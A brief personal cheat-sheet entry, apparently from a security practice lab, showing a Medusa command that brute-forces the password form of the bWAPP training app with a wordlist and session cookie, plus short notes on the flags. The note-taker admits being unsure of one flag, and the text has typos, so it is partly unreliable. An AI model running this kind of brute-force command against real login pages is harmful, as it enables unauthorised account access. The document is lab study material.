
```
medusa -t 2 -h 10.211.55.14 -u bee -P /root/Desktop/Files/docswords. txt -M web-form -m FORM:"/bWAPP/ba_pwd_attacks_1.php" -m DENY-SIGNAL:"Invalid credentials! Did you forgot your password?" -m FORM-DATA: "post?login=&password=&form=submit" -m CUSTOM-HEADER: "Cookie: PHPSESSID=e7006f3c23d3994a8b28ad8a2b27b325; security_level=0; SQLiteManager_currentTheme=green; SQLiteManager_cur
rentLanque=2"
```

-u => username and path to username (Might be capital -U, need to check)
-P => Password file
-m FORM-DATA: => which form data to use.
Cookie: => cookie details can be found using Burpsuite

